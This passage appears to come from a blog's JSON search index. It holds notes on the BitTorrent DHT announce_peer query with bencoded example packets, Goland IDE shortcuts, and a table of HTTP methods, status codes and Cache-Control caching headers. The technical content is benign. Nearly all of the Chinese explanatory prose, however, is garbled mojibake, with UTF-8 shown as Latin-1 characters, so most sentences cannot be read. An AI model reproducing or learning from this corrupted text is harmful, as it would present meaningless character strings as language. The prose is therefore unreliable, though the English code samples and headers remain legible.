\"nodes\" : \"<compact node info>\"}\n```\n\n+ <font color=\"red\"> announce_peer: è¿™ä¸ªè¯·æ±‚ç”¨æ¥è¡¨æ˜å‘å‡º announce_peer è¯·æ±‚çš„èŠ‚ç‚¹ï¼Œæ­£åœ¨æŸä¸ªç«¯å£ä¸‹è½½ torrent æ–‡ä»¶</font>\n\nannounce_peer åŒ…å« 4 ä¸ªå‚æ•°\n\t\n```\n1. ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ id: åŒ…å«äº†è¯·æ±‚èŠ‚ç‚¹çš„ ID\n2. ç¬¬äºŒä¸ªå‚æ•°æ˜¯ info_hash: åŒ…å«äº† torrent æ–‡ä»¶çš„ infohash\n3. ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ port: åŒ…å«äº†æ•´å‹çš„ç«¯å£å·ï¼Œè¡¨æ˜ peer åœ¨å“ªä¸ªç«¯å£ä¸‹è½½\n4. ç¬¬å››ä¸ªå‚æ•°æ•°æ˜¯ token: è¿™æ˜¯åœ¨ä¹‹å‰çš„ get_peers è¯·æ±‚ä¸­æ”¶åˆ°çš„å›å¤ä¸­åŒ…å«çš„ã€‚æ”¶åˆ° announce_peer è¯·æ±‚çš„èŠ‚ç‚¹å¿…é¡»æ£€æŸ¥è¿™ä¸ª token ä¸ä¹‹å‰æˆ‘ä»¬å›å¤ç»™è¿™ä¸ªèŠ‚ç‚¹ get_peers çš„ token æ˜¯å¦ç›¸åŒ(ä¹Ÿå°±è¯´ï¼Œæ‰€æœ‰ä¸‹è½½è€…/å‘å¸ƒè€…éƒ½è¦å‚ä¸æ£€æµ‹æ–°åŠ å…¥çš„å‘å¸ƒè€…æ˜¯å¦ä¼ªé€ äº†è¯¥èµ„æºï¼Œä½†æ˜¯è¿™ä¸ªæœºåˆ¶æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæœ€å¼€å§‹çš„é‚£ä¸ªå‘å¸ƒè€…å°±ä¼ªé€ ï¼Œåˆ™æ•´æ¡é“¾è·¯éƒ½æ˜¯ä¸€ä¸ªä¼ªé€ çš„é”™çš„èµ„æºinfohashä¿¡æ¯äº†)\nå¦‚æœç›¸åŒï¼Œé‚£ä¹ˆè¢«è¯·æ±‚çš„èŠ‚ç‚¹å°†è®°å½•å‘é€ announce_peer èŠ‚ç‚¹çš„ IP å’Œè¯·æ±‚ä¸­åŒ…å«çš„ port ç«¯å£å·åœ¨ peer è”ç³»ä¿¡æ¯ä¸­å¯¹åº”çš„ infohash ä¸‹ï¼Œè¿™æ„å‘³ç€ä¸€ä¸ªä¸€ä¸ªäº‹å®: å½“å‰è¿™ä¸ªèµ„æºæœ‰ä¸€ä¸ªæ–°çš„peeræä¾›è€…äº†ï¼Œä¸‹ä¸€æ¬¡æœ‰å…¶ä»–èŠ‚ç‚¹å¸Œæœ›æˆ–è€…è¿™ä¸ªèµ„æºçš„æ—¶å€™ï¼Œä¼šæŠŠè¿™ä¸ªæ–°çš„(å‰ä¸€æ¬¡è¯·æ±‚ä¸‹è½½èµ„æºçš„èŠ‚ç‚¹)ä¹Ÿå½“ä½œä¸€ä¸ªpeerè¿”å›ç»™è¯·æ±‚è€…ï¼Œè¿™æ ·ï¼Œèµ„æºçš„æä¾›è€…å°±è¶Šæ¥è¶Šå¤šï¼Œèµ„æºå…±äº«é€Ÿåº¦å°±è¶Šæ¥è¶Šå¿«\n```\n\nä¸€ä¸ªpeeræ­£åœ¨ä¸‹è½½æŸä¸ªèµ„æºï¼Œæ„å‘³ç€è¯¥peeræœ‰èƒ½å¤Ÿè®¿é—®åˆ°è¯¥èµ„æºçš„æ¸ é“ï¼Œä¸”è¯¥peeræœ¬åœ°æ˜¯æœ‰è¿™ä»½èµ„æºçš„å…¨éƒ¨æˆ–éƒ¨åˆ†æ‹·è´çš„ï¼Œå®ƒéœ€è¦å‘DHTç½‘ç»œå¹¿æ’­announceæ¶ˆæ¯ï¼Œå‘Šè¯‰å…¶ä»–èŠ‚ç‚¹è¿™ä¸ªèµ„æºçš„ä¸‹è½½åœ°å€\n\t\n```\narguments:  {\"id\" : \"<querying nodes id>\",\n\"implied_port\": <0 or 1>,\n\"info_hash\" : \"<20-byte infohash of target torrent>\",\n\"port\" : <port number>,\n\"token\" : \"<opaque token>\"}\n\t\nresponse: {\"id\" : \"<queried nodes id>\"}\n```\n\næŠ¥æ–‡åŒ…ä¾‹å­ Example Packets \n\t\n```\nannounce_peers Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"announce_peer\", \"a\": {\"id\":\"abcdefghij0123456789\", \"implied_port\": 1, \"info_hash\":\"mnopqrstuvwxyz123456\", \"port\": 6881, \"token\": \"aoeusnth\"}}\nbencoded = d1:ad2:id20:abcdefghij01234567899:info_hash20:<br />\nmnopqrstuvwxyz1234564:porti6881e5:token8:aoeusnthe1:q13:announce_peer1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n### 0x3: å›å¤ Responses\n\nå›å¤ Responsesçš„åŒ…å·²ç»åœ¨ä¸Šé¢çš„Queryé‡Œè¯´æ˜äº†\n\n\n### 0x4: é”™è¯¯ Errors\n\né”™è¯¯åŒ…ä¾‹å­ Example Error Packets\n\n```\ngeneric error = {\"t\":\"aa\", \"y\":\"e\", \"e\":[201, \"A Generic Error Ocurred\"]}\nbencoded = d1:eli201e23:A Generic Error Ocurrede1:t2:aa1:y1:ee\n```\n\n\n","tags":["dht"],"categories":["bittorrent"]},{"title":"golang_ide_golandä½¿ç”¨","url":"%2Fp%2F5a4d0049.html","content":"\n\n\n# 1. è‡ªåŠ¨æ ¼å¼åŒ–å’Œå¯¼å…¥åŒ…\n\n`go fmt + go imports`\n\ngo to preferences ->Tools ->File Watchers and enable go fmt . This way on each save it will format the file.\n\n\ngoland tools->filewatchers->go fmt| go imports\n\n<!-- more -->\n\n# 2. å¿«æ·é”®\n\n+ åˆ é™¤è¡Œ cmd + x\n\n+ å¤åˆ¶è¡Œ cmd + d\n\n+ è¿›å…¥è¿”å›å‡½æ•° cmd + [] \n\n  \n\n# 3. å°æŠ€å·§\n\n### 3.1 sturctæŸ¥çœ‹\n\n+ æŸ¥çœ‹structå®ç°äº†å“ªäº›æ¥å£ `cmd + u`\n\n### 3.2 interfaceæŸ¥çœ‹\n\n- æŸ¥çœ‹å®ç°çš„Structçš„åˆ—è¡¨   ` ctrl + h`\n\n### 3.3 å°æŠ€å·§\n\n+ å‘¼å‡ºæœ€è¿‘æ–‡ä»¶å’Œå¸¸ç”¨åŠŸèƒ½ `cmd + E` , favorites å¯ä»¥æŸ¥çœ‹ä¹¦ç­¾/æ–­ç‚¹/æ”¶è—\n\n+ æ–‡ä»¶å¯¼èˆª  cmd + 7\n\n  æŠ˜å , å±•å¼€,è®¾ç½®,éšè—\n\n  æŒ‰å¯¼å‡ºæ’åº(å»ºè®®), æŒ‰å­—æ¯æ’åº(å»ºè®®),  ç§æœ‰å‡½æ•°(å»ºè®®),  éå½“å‰æ–‡ä»¶çš„å±æ€§(ä¸å»ºè®®)\n\n### 3.4 å…¶ä»–\n\n+ å¿«é€Ÿæœç´¢æ–‡ä»¶åå­—:   ä¸¤æ¬¡ shift\n+ æ¯”è¾ƒæ–‡ä»¶: é€‰æ‹©ä¸¤ä¸ªæ–‡ä»¶ `cmd+d`, æ–¹ä¾¿æ¯”è¾ƒjson\n\n\n\n# 4. é”™è¯¯è§£å†³\n\n### 4.1  Cannot resolve symbol\n\né¼ æ ‡åœ¨æŠ¥é”™åœ°æ–¹, å¼¹å‡ºæç¤ºï¼Œsyncå³å¯è§£å†³ã€‚\n","tags":["golang"],"categories":["3_golangæ‚é¡¹"]},{"title":"httpçš„åŸç†å’ŒæŠ€æœ¯","url":"%2Fp%2Fb03bc449.html","content":"\n# 1. http åŸºç¡€\n\n### 1.1 method\n\nHTTP1.0 å®šä¹‰äº†ä¸‰ç§è¯·æ±‚æ–¹æ³•ï¼š GET, POST å’Œ HEADæ–¹æ³•ã€‚\n\nHTTP1.1 æ–°å¢äº†å…­ç§è¯·æ±‚æ–¹æ³•ï¼šOPTIONSã€PUTã€PATCHã€DELETEã€TRACE å’Œ CONNECT æ–¹æ³•ã€‚\n\n<!-- more -->\n\n| åºå· | æ–¹æ³•    | æè¿°                                                         |\n| :--- | :------ | :----------------------------------------------------------- |\n| 1    | GET     | è¯·æ±‚æŒ‡å®šçš„é¡µé¢ä¿¡æ¯ï¼Œå¹¶è¿”å›å®ä½“ä¸»ä½“ã€‚                         |\n| 2    | HEAD    | ç±»ä¼¼äº GET è¯·æ±‚ï¼Œåªä¸è¿‡è¿”å›çš„å“åº”ä¸­æ²¡æœ‰å…·ä½“çš„å†…å®¹ï¼Œç”¨äºè·å–æŠ¥å¤´ |\n| 3    | POST    | å‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POST è¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„å»ºç«‹å’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚ |\n| 4    | PUT     | ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€çš„æ•°æ®å–ä»£æŒ‡å®šçš„æ–‡æ¡£çš„å†…å®¹ã€‚             |\n| 5    | DELETE  | è¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŒ‡å®šçš„é¡µé¢ã€‚                                   |\n| 6    | CONNECT | HTTP/1.1 åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚    |\n| 7    | OPTIONS | å…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹æœåŠ¡å™¨çš„æ€§èƒ½ã€‚                                 |\n| 8    | TRACE   | å›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­ã€‚                   |\n| 9    | PATCH   | æ˜¯å¯¹ PUT æ–¹æ³•çš„è¡¥å……ï¼Œç”¨æ¥å¯¹å·²çŸ¥èµ„æºè¿›è¡Œå±€éƒ¨æ›´æ–° ã€‚           |\n\n### 1.2 çŠ¶æ€ç \n\n| çŠ¶æ€ç  | çŠ¶æ€ç è‹±æ–‡åç§°                  | ä¸­æ–‡æè¿°                                                     |\n| :----- | :------------------------------ | :----------------------------------------------------------- |\n| 100    | Continue                        | ç»§ç»­ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­å…¶è¯·æ±‚                                     |\n| 101    | Switching Protocols             | åˆ‡æ¢åè®®ã€‚æœåŠ¡å™¨æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚åˆ‡æ¢åè®®ã€‚åªèƒ½åˆ‡æ¢åˆ°æ›´é«˜çº§çš„åè®®ï¼Œä¾‹å¦‚ï¼Œåˆ‡æ¢åˆ°HTTPçš„æ–°ç‰ˆæœ¬åè®® |\n|        |                                 |                                                              |\n| 200    | OK                              | è¯·æ±‚æˆåŠŸã€‚ä¸€èˆ¬ç”¨äºGETä¸POSTè¯·æ±‚                              |\n| 201    | Created                         | å·²åˆ›å»ºã€‚æˆåŠŸè¯·æ±‚å¹¶åˆ›å»ºäº†æ–°çš„èµ„æº                             |\n| 202    | Accepted                        | å·²æ¥å—ã€‚å·²ç»æ¥å—è¯·æ±‚ï¼Œä½†æœªå¤„ç†å®Œæˆ                           |\n| 203    | Non-Authoritative Information   | éæˆæƒä¿¡æ¯ã€‚è¯·æ±‚æˆåŠŸã€‚ä½†è¿”å›çš„metaä¿¡æ¯ä¸åœ¨åŸå§‹çš„æœåŠ¡å™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå‰¯æœ¬ |\n| 204    | No Content                      | æ— å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†ï¼Œä½†æœªè¿”å›å†…å®¹ã€‚åœ¨æœªæ›´æ–°ç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯ç¡®ä¿æµè§ˆå™¨ç»§ç»­æ˜¾ç¤ºå½“å‰æ–‡æ¡£ |\n| 205    | Reset Content                   | é‡ç½®å†…å®¹ã€‚æœåŠ¡å™¨å¤„ç†æˆåŠŸï¼Œç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰åº”é‡ç½®æ–‡æ¡£è§†å›¾ã€‚å¯é€šè¿‡æ­¤è¿”å›ç æ¸…é™¤æµè§ˆå™¨çš„è¡¨å•åŸŸ |\n| 206    | Partial Content                 | éƒ¨åˆ†å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†éƒ¨åˆ†GETè¯·æ±‚                        |\n|        |                                 |                                                              |\n| 300    | Multiple Choices                | å¤šç§é€‰æ‹©ã€‚è¯·æ±‚çš„èµ„æºå¯åŒ…æ‹¬å¤šä¸ªä½ç½®ï¼Œç›¸åº”å¯è¿”å›ä¸€ä¸ªèµ„æºç‰¹å¾ä¸åœ°å€çš„åˆ—è¡¨ç”¨äºç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰é€‰æ‹© |\n| 301    | Moved Permanently               | æ°¸ä¹…ç§»åŠ¨ã€‚è¯·æ±‚çš„èµ„æºå·²è¢«æ°¸ä¹…çš„ç§»åŠ¨åˆ°æ–°URIï¼Œè¿”å›ä¿¡æ¯ä¼šåŒ…æ‹¬æ–°çš„URIï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å®šå‘åˆ°æ–°URIã€‚ä»Šåä»»ä½•æ–°çš„è¯·æ±‚éƒ½åº”ä½¿ç”¨æ–°çš„URIä»£æ›¿ |\n| 302    | Found                           | ä¸´æ—¶ç§»åŠ¨ã€‚ä¸301ç±»ä¼¼ã€‚ä½†èµ„æºåªæ˜¯ä¸´æ—¶è¢«ç§»åŠ¨ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­ä½¿ç”¨åŸæœ‰URI |\n| 303    | See Other                       | æŸ¥çœ‹å…¶å®ƒåœ°å€ã€‚ä¸301ç±»ä¼¼ã€‚ä½¿ç”¨GETå’ŒPOSTè¯·æ±‚æŸ¥çœ‹               |\n| 304    | Not Modified                    | æœªä¿®æ”¹ã€‚æ‰€è¯·æ±‚çš„èµ„æºæœªä¿®æ”¹ï¼ŒæœåŠ¡å™¨è¿”å›æ­¤çŠ¶æ€ç æ—¶ï¼Œä¸ä¼šè¿”å›ä»»ä½•èµ„æºã€‚å®¢æˆ·ç«¯é€šå¸¸ä¼šç¼“å­˜è®¿é—®è¿‡çš„èµ„æºï¼Œé€šè¿‡æä¾›ä¸€ä¸ªå¤´ä¿¡æ¯æŒ‡å‡ºå®¢æˆ·ç«¯å¸Œæœ›åªè¿”å›åœ¨æŒ‡å®šæ—¥æœŸä¹‹åä¿®æ”¹çš„èµ„æº |\n| 305    | Use Proxy                       | ä½¿ç”¨ä»£ç†ã€‚æ‰€è¯·æ±‚çš„èµ„æºå¿…é¡»é€šè¿‡ä»£ç†è®¿é—®                       |\n| 306    | Unused                          | å·²ç»è¢«åºŸå¼ƒçš„HTTPçŠ¶æ€ç                                        |\n| 307    | Temporary Redirect              | ä¸´æ—¶é‡å®šå‘ã€‚ä¸302ç±»ä¼¼ã€‚ä½¿ç”¨GETè¯·æ±‚é‡å®šå‘                     |\n|        |                                 |                                                              |\n| 400    | Bad Request                     | å®¢æˆ·ç«¯è¯·æ±‚çš„è¯­æ³•é”™è¯¯ï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£                         |\n| 401    | Unauthorized                    | è¯·æ±‚è¦æ±‚ç”¨æˆ·çš„èº«ä»½è®¤è¯                                       |\n| 402    | Payment Required                | ä¿ç•™ï¼Œå°†æ¥ä½¿ç”¨                                               |\n| 403    | Forbidden                       | æœåŠ¡å™¨ç†è§£è¯·æ±‚å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æ‰§è¡Œæ­¤è¯·æ±‚               |\n| 404    | Not Found                       | æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚æ‰¾åˆ°èµ„æºï¼ˆç½‘é¡µï¼‰ã€‚é€šè¿‡æ­¤ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯è®¾ç½®\"æ‚¨æ‰€è¯·æ±‚çš„èµ„æºæ— æ³•æ‰¾åˆ°\"çš„ä¸ªæ€§é¡µé¢ |\n| 405    | Method Not Allowed              | å®¢æˆ·ç«¯è¯·æ±‚ä¸­çš„æ–¹æ³•è¢«ç¦æ­¢                                     |\n| 406    | Not Acceptable                  | æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚çš„å†…å®¹ç‰¹æ€§å®Œæˆè¯·æ±‚                   |\n| 407    | Proxy Authentication Required   | è¯·æ±‚è¦æ±‚ä»£ç†çš„èº«ä»½è®¤è¯ï¼Œä¸401ç±»ä¼¼ï¼Œä½†è¯·æ±‚è€…åº”å½“ä½¿ç”¨ä»£ç†è¿›è¡Œæˆæƒ |\n| 408    | Request Time-out                | æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æ—¶é—´è¿‡é•¿ï¼Œè¶…æ—¶                     |\n| 409    | Conflict                        | æœåŠ¡å™¨å®Œæˆå®¢æˆ·ç«¯çš„ PUT è¯·æ±‚æ—¶å¯èƒ½è¿”å›æ­¤ä»£ç ï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿäº†å†²çª |\n| 410    | Gone                            | å®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºå·²ç»ä¸å­˜åœ¨ã€‚410ä¸åŒäº404ï¼Œå¦‚æœèµ„æºä»¥å‰æœ‰ç°åœ¨è¢«æ°¸ä¹…åˆ é™¤äº†å¯ä½¿ç”¨410ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯é€šè¿‡301ä»£ç æŒ‡å®šèµ„æºçš„æ–°ä½ç½® |\n| 411    | Length Required                 | æœåŠ¡å™¨æ— æ³•å¤„ç†å®¢æˆ·ç«¯å‘é€çš„ä¸å¸¦Content-Lengthçš„è¯·æ±‚ä¿¡æ¯       |\n| 412    | Precondition Failed             | å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯çš„å…ˆå†³æ¡ä»¶é”™è¯¯                                 |\n| 413    | Request Entity Too Large        | ç”±äºè¯·æ±‚çš„å®ä½“è¿‡å¤§ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ï¼Œå› æ­¤æ‹’ç»è¯·æ±‚ã€‚ä¸ºé˜²æ­¢å®¢æˆ·ç«¯çš„è¿ç»­è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå…³é—­è¿æ¥ã€‚å¦‚æœåªæ˜¯æœåŠ¡å™¨æš‚æ—¶æ— æ³•å¤„ç†ï¼Œåˆ™ä¼šåŒ…å«ä¸€ä¸ªRetry-Afterçš„å“åº”ä¿¡æ¯ |\n| 414    | Request-URI Too Large           | è¯·æ±‚çš„URIè¿‡é•¿ï¼ˆURIé€šå¸¸ä¸ºç½‘å€ï¼‰ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†               |\n| 415    | Unsupported Media Type          | æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚é™„å¸¦çš„åª’ä½“æ ¼å¼                             |\n| 416    | Requested range not satisfiable | å®¢æˆ·ç«¯è¯·æ±‚çš„èŒƒå›´æ— æ•ˆ                                         |\n| 417    | Expectation Failed              | æœåŠ¡å™¨æ— æ³•æ»¡è¶³Expectçš„è¯·æ±‚å¤´ä¿¡æ¯                             |\n|        |                                 |                                                              |\n| 500    | Internal Server Error           | æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œæ— æ³•å®Œæˆè¯·æ±‚                                 |\n| 501    | Not Implemented                 | æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„åŠŸèƒ½ï¼Œæ— æ³•å®Œæˆè¯·æ±‚                         |\n| 502    | Bad Gateway                     | ä½œä¸ºç½‘å…³æˆ–è€…ä»£ç†å·¥ä½œçš„æœåŠ¡å™¨å°è¯•æ‰§è¡Œè¯·æ±‚æ—¶ï¼Œä»è¿œç¨‹æœåŠ¡å™¨æ¥æ”¶åˆ°äº†ä¸€ä¸ªæ— æ•ˆçš„å“åº” |\n| 503    | Service Unavailable             | ç”±äºè¶…è½½æˆ–ç³»ç»Ÿç»´æŠ¤ï¼ŒæœåŠ¡å™¨æš‚æ—¶çš„æ— æ³•å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å»¶æ—¶çš„é•¿åº¦å¯åŒ…å«åœ¨æœåŠ¡å™¨çš„Retry-Afterå¤´ä¿¡æ¯ä¸­ |\n| 504    | Gateway Time-out                | å……å½“ç½‘å…³æˆ–ä»£ç†çš„æœåŠ¡å™¨ï¼ŒæœªåŠæ—¶ä»è¿œç«¯æœåŠ¡å™¨è·å–è¯·æ±‚           |\n| 505    | HTTP Version not supported      | æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„HTTPåè®®çš„ç‰ˆæœ¬ï¼Œæ— æ³•å®Œæˆå¤„ç†               |\n\n# 2. http æŠ€æœ¯\n\n### 2.1 http ç¼“å­˜\n\nè™½ç„¶ HTTP ç¼“å­˜ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†é‡ç”¨ç¼“å­˜çš„èµ„æºé€šå¸¸æ˜¯å¿…è¦çš„ã€‚ç„¶è€Œå¸¸è§çš„ HTTP ç¼“å­˜åªèƒ½å­˜å‚¨ [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) å“åº”ï¼Œå¯¹äºå…¶ä»–ç±»å‹çš„å“åº”åˆ™æ— èƒ½ä¸ºåŠ›ã€‚ç¼“å­˜çš„å…³é”®ä¸»è¦åŒ…æ‹¬request methodå’Œç›®æ ‡URIï¼ˆä¸€èˆ¬åªæœ‰GETè¯·æ±‚æ‰ä¼šè¢«ç¼“å­˜ï¼‰ã€‚\n\nHTTP/1.1å®šä¹‰çš„ [`Cache-Control`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control) å¤´ç”¨æ¥åŒºåˆ†å¯¹ç¼“å­˜æœºåˆ¶çš„æ”¯æŒæƒ…å†µï¼Œ è¯·æ±‚å¤´å’Œå“åº”å¤´éƒ½æ”¯æŒè¿™ä¸ªå±æ€§ã€‚é€šè¿‡å®ƒæä¾›çš„ä¸åŒçš„å€¼æ¥å®šä¹‰ç¼“å­˜ç­–ç•¥ã€‚\n\n+ æ²¡æœ‰ç¼“å­˜\n\n  ç¼“å­˜ä¸­ä¸å¾—å­˜å‚¨ä»»ä½•å…³äºå®¢æˆ·ç«¯è¯·æ±‚å’ŒæœåŠ¡ç«¯å“åº”çš„å†…å®¹ã€‚æ¯æ¬¡ç”±å®¢æˆ·ç«¯å‘èµ·çš„è¯·æ±‚éƒ½ä¼šä¸‹è½½å®Œæ•´çš„å“åº”å†…å®¹ã€‚\n\n  ```html\n  Cache-Control: no-store\n  ```\n\n+ ç¼“å­˜ä½†é‡æ–°éªŒè¯\n\n  æ¯æ¬¡æœ‰è¯·æ±‚å‘å‡ºæ—¶ï¼Œç¼“å­˜ä¼šå°†æ­¤è¯·æ±‚å‘åˆ°æœåŠ¡å™¨ï¼ˆæ³¨ï¼šè¯¥è¯·æ±‚åº”è¯¥ä¼šå¸¦æœ‰ä¸æœ¬åœ°ç¼“å­˜ç›¸å…³çš„éªŒè¯å­—æ®µï¼‰ï¼ŒæœåŠ¡å™¨ç«¯ä¼šéªŒè¯è¯·æ±‚ä¸­æ‰€æè¿°çš„ç¼“å­˜æ˜¯å¦è¿‡æœŸï¼Œè‹¥æœªè¿‡æœŸï¼ˆæ³¨ï¼šå®é™…å°±æ˜¯è¿”å›304ï¼‰ï¼Œåˆ™ç¼“å­˜æ‰ä½¿ç”¨æœ¬åœ°ç¼“å­˜å‰¯æœ¬ã€‚\n\n  ```html\n  Cache-Control: no-cache\n  ```\n\n+ ç§æœ‰å’Œå…¬å…±ç¼“å­˜\n\n  + \"public\" æŒ‡ä»¤è¡¨ç¤ºè¯¥å“åº”å¯ä»¥è¢«ä»»ä½•ä¸­é—´äººï¼ˆæ³¨ï¼šæ¯”å¦‚ä¸­é—´ä»£ç†ã€CDNç­‰ï¼‰ç¼“å­˜ã€‚\n\n    è‹¥æŒ‡å®šäº†\"public\"ï¼Œåˆ™ä¸€äº›é€šå¸¸ä¸è¢«ä¸­é—´äººç¼“å­˜çš„é¡µé¢ï¼ˆæ¯”å¦‚ å¸¦æœ‰HTTPéªŒè¯ä¿¡æ¯ï¼ˆå¸å·å¯†ç ï¼‰çš„é¡µé¢ æˆ– æŸäº›ç‰¹å®šçŠ¶æ€ç çš„é¡µé¢ï¼‰ï¼Œå°†ä¼šè¢«å…¶ç¼“å­˜ã€‚\n\n  + \"private\" åˆ™è¡¨ç¤ºè¯¥å“åº”æ˜¯ä¸“ç”¨äºæŸå•ä¸ªç”¨æˆ·çš„ï¼Œä¸­é—´äººä¸èƒ½ç¼“å­˜æ­¤å“åº”ï¼Œè¯¥å“åº”åªèƒ½åº”ç”¨äºæµè§ˆå™¨ç§æœ‰ç¼“å­˜ä¸­ã€‚\n\n  ```html\n  Cache-Control: private\n  Cache-Control: public\n  ```\n\n+ è¿‡æœŸ\n\n  è¿‡æœŸæœºåˆ¶ä¸­ï¼Œæœ€é‡è¦çš„æŒ‡ä»¤æ˜¯ \"`max-age=<seconds>`\"ï¼Œè¡¨ç¤ºèµ„æºèƒ½å¤Ÿè¢«ç¼“å­˜ï¼ˆä¿æŒæ–°é²œï¼‰çš„æœ€å¤§æ—¶é—´ã€‚ç›¸å¯¹[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)è€Œè¨€ï¼Œmax-ageæ˜¯è·ç¦»è¯·æ±‚å‘èµ·çš„æ—¶é—´çš„ç§’æ•°ã€‚é’ˆå¯¹åº”ç”¨ä¸­é‚£äº›ä¸ä¼šæ”¹å˜çš„æ–‡ä»¶ï¼Œé€šå¸¸å¯ä»¥æ‰‹åŠ¨è®¾ç½®ä¸€å®šçš„æ—¶é•¿ä»¥ä¿è¯ç¼“å­˜æœ‰æ•ˆï¼Œä¾‹å¦‚å›¾ç‰‡ã€cssã€jsç­‰é™æ€èµ„æºã€‚\n\n  ```html\n  Cache-Control: max-age=31536000\n  ```\n\n+ éªŒè¯æ–¹å¼\n\n  å½“ä½¿ç”¨äº† \"`must-revalidate`\" æŒ‡ä»¤ï¼Œé‚£å°±æ„å‘³ç€ç¼“å­˜åœ¨è€ƒè™‘ä½¿ç”¨ä¸€ä¸ªé™ˆæ—§çš„èµ„æºæ—¶ï¼Œå¿…é¡»å…ˆéªŒè¯å®ƒçš„çŠ¶æ€ï¼Œå·²è¿‡æœŸçš„ç¼“å­˜å°†ä¸è¢«ä½¿ç”¨ã€‚\n\n  ```html\n  Cache-Control: must-revalidate\n  ```\n\n**ç¼“å­˜éªŒè¯**\n\nå½“å‘æœåŠ¡ç«¯å‘èµ·ç¼“å­˜æ ¡éªŒçš„è¯·æ±‚æ—¶ï¼ŒæœåŠ¡ç«¯ä¼šè¿”å› [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) okè¡¨ç¤ºè¿”å›æ­£å¸¸çš„ç»“æœæˆ–è€… [`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) Not Modified(ä¸è¿”å›body)è¡¨ç¤ºæµè§ˆå™¨å¯ä»¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜æ–‡ä»¶ã€‚304çš„å“åº”å¤´ä¹Ÿå¯ä»¥åŒæ—¶æ›´æ–°ç¼“å­˜æ–‡æ¡£çš„è¿‡æœŸæ—¶é—´ã€‚\n\n+ ETags\n\n  ä½œä¸ºç¼“å­˜çš„ä¸€ç§å¼ºæ ¡éªŒå™¨ï¼Œ[`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) å“åº”å¤´æ˜¯ä¸€ä¸ªå¯¹ç”¨æˆ·ä»£ç†(User Agent, ä¸‹é¢ç®€ç§°UA)ä¸é€æ˜çš„å€¼ã€‚\n\n  å¦‚æœèµ„æºè¯·æ±‚çš„å“åº”å¤´é‡Œå«æœ‰ETag, å®¢æˆ·ç«¯å¯ä»¥åœ¨åç»­çš„è¯·æ±‚çš„å¤´ä¸­å¸¦ä¸Š [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match) å¤´æ¥éªŒè¯ç¼“å­˜ã€‚\n\n+ Last-Modified\n\n   å“åº”å¤´å¯ä»¥ä½œä¸ºä¸€ç§å¼±æ ¡éªŒå™¨ã€‚è¯´å®ƒå¼±æ˜¯å› ä¸ºå®ƒåªèƒ½ç²¾ç¡®åˆ°ä¸€ç§’ã€‚\n\n  